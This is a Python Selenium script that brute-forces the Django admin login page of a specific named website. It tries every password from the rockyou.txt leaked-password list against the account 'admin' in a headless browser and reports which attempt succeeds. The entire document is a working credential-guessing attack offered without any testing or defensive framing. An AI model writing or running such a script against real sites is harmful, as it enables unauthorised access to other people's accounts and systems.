from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
def lin(filename):
    with open(filename, 'r') as file:
        for line in file:
            yield line.strip()
def login(username, password):
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--disable-audio")
    driver = webdriver.Chrome(options=chrome_options)
    driver.get("https://ssidollars.pythonanywhere.com/admin/login/")
    username_field = WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.ID, "id_username"))
    )
    password_field = driver.find_element(By.ID, "id_password")
    username_field.send_keys(username)
    password_field.send_keys(password)
    login_button = driver.find_element(By.CSS_SELECTOR, "input[type='submit']")
    login_button.click()
    try:
        error_message = WebDriverWait(driver, 5).until(
            EC.presence_of_element_located((By.CLASS_NAME, "errornote"))
        )
        print("Error: " + error_message.text)
        return False
    except:
        print("Login successful!")
        return True
    finally:
        driver.quit()
for line in lin("/Users/lung/Documents/rockyou.txt"):
    word = login("admin", line)
    if word:
        print("succeeded for {} and {}".format("admin", line))
    else:
        print("failed for {} and {}".format("admin", line))

